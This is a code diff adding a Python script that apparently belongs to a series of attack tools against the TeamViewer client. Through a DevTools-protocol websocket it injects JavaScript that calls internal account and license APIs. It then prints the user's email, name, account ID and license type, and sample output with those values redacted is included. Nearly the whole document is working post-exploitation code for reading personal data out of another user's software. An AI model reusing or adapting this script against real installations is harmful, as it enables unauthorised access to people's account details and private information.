@@ -1,0 +1,49 @@
+"""
+teamviewer_account_extraction.py -- Datos de cuenta y licencia
+Extrae informacion de la cuenta asociada al TeamViewer.
+"""
+import websocket
+import json
+
+INTERNAL_DOMAIN = "https://teamviewer-internal-<HASH>"
+
+def extract_account_info(ws):
+    """Extraer datos de la cuenta y licencia."""
+    endpoints = {
+        "account": f"{INTERNAL_DOMAIN}/api/account/v1/account",
+        "licenses": f"{INTERNAL_DOMAIN}/api/account/v1/licenses",
+    }
+
+    for name, url in endpoints.items():
+        js = f"""
+        (async () => {{
+            const r = await fetch('{url}');
+            return JSON.stringify(await r.json());
+        }})()
+        """
+
+        ws.send(json.dumps({
+            "id": 20,
+            "method": "Runtime.evaluate",
+            "params": {"expression": js, "awaitPromise": True}
+        }))
+
+        result = json.loads(ws.recv())
+        data = json.loads(result["result"]["result"]["value"])
+
+        print(f"[+] Endpoint: {name}")
+        for key, val in data.items():
+            val_str = str(val)[:60]
+            print(f"    {key}: {val_str}")
+        print()
+
+    return data
+
+# Output (redactado):
+# Endpoint: account
+#     email: <EMAIL_REDACTED>
+#     name: <NAME_REDACTED>
+#     accountId: <ACCOUNT_ID_REDACTED>
+#
+# Endpoint: licenses
+#     licenseType: <LICENSE_TYPE_REDACTED>
